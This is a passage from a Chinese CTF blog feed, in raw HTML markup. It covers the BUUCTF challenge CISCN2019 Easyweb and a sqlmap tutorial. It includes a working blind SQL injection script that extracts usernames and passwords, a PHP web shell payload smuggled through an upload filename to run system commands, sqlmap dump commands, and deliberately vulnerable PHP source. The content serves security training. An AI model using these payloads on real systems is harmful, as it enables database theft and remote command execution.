&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;输出：select &lt;span style=&#34;color:#ff79c6&#34;&gt;*&lt;/span&gt; from images where id&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;\&amp;#39; or path=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上脚本&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt;  requests
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;url &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#查表 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload1&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;?id=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;amp;path=or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;,1))&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;%23&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#查列 &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload2&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;?id=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;amp;path=or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;,1))&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;%23&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#查用户名&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload3&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;?id=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;amp;path=or ascii(substr((select group_concat(username) from users),&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;,1))&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;%23&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#查密码&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload4&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;?id=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;amp;path=or ascii(substr((select group_concat(password) from users),&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;,1))&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;%23&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;result&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#bd93f9&#34;&gt;10000&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    low &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    high &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;128&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    mid &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; (low &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; high) &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;while&lt;/span&gt; (low &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;&lt;/span&gt; high):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#6272a4&#34;&gt;#payload = payload1.format(i, mid)  # images,users&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#6272a4&#34;&gt;#payload = payload2.format(i, mid)  # username, password&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#6272a4&#34;&gt;#payload = payload3.format(i, mid)  # admin&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        payload &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; payload4&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;format(i, mid)   &lt;span style=&#34;color:#6272a4&#34;&gt;# dc268983c380339547ce&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        new_url &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; url &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; payload
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        response &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;get(new_url)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;JFIF&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; response&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;text:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            low &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; mid &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            high &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; mid
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        mid &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; (low &lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt; high) &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (mid &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;or&lt;/span&gt; mid &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;132&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    result &lt;span style=&#34;color:#ff79c6&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;chr&lt;/span&gt;(mid)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(result)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得出用户admin&lt;/p&gt;
&lt;p&gt;密码（每次重建环境会换）&lt;/p&gt;
&lt;p&gt;登录，文件上传，上传一个shell发现他是对文件名过滤，如果文件名里出现php就会报错，而上传之后会显示文件名，我们可以修改文件夹名为一句话木马。&lt;/p&gt;
&lt;p&gt;在PHP的配置文件（php.ini）中有一个short_open_tag的值，开启以后可以使用PHP的短标签：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;开启短标签之后除了&amp;lt;?php ?&amp;gt;，可使用更灵活的调用方法
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;? /*程序操作*/ ?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?=/*函数*/?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;抓包修改上传的filename为&lt;code&gt;&amp;lt;?=@system($_GET[a]);?&amp;gt;.phtml&lt;/code&gt;，注意别把引号给搞没了就行。成功后走一个cat /flag&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6273aeee0947543129ebdca3.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6273aeee0947543129ebdca3.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ok&#39;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>sqlmap使用实例</title>
        <link>https://proben1.github.io/2022/sqlmap%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/</link>
        <pubDate>Tue, 03 May 2022 21:08:57 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/sqlmap%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/</guid>
        <description>&lt;p&gt;学安全的时候第一件事就是在学长要求下安了sqlmap，可到现在还是只会这个：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34; --dbs
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34; -D xx --tables 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34; -D xx -T xx --columns
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34; -D xx -T xx -C xx,xx --dump
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者一个post，把包抓下来，用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -r post.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;今天就用一道题来演示一下，sqlmap的其他功能：&lt;/p&gt;
&lt;p&gt;题目是：[CISCN2019 总决赛 Day2 Web1]Easyweb&lt;/p&gt;
&lt;p&gt;源码：https://github.com/glzjin/CISCN_2019_Final_12_Day2_Web1&lt;/p&gt;
&lt;p&gt;或者直接buu搜……&lt;/p&gt;
&lt;p&gt;首先来审下题，robots.txt泄露出存在*.php.bak，再挨个php试一下，可以下载到image.php.bak，下面是审计部分，和sqlmap没关系，可以直接跳到结果部分&lt;/p&gt;
&lt;p&gt;源码如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;config.php&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;addslashes(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;addslashes(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;str_replace(&lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;str_replace(&lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;mysqli_query(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$con&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;select * from images where id=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39; or path=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$row&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;mysqli_fetch_array(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt;,MYSQLI_ASSOC);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;./&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$row&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;header(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Content-Type: image/jpeg&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;readfile(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们发现addslashes()和str_replace()一起使用引起了安全隐患，当我们id输入为\0时，测试如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
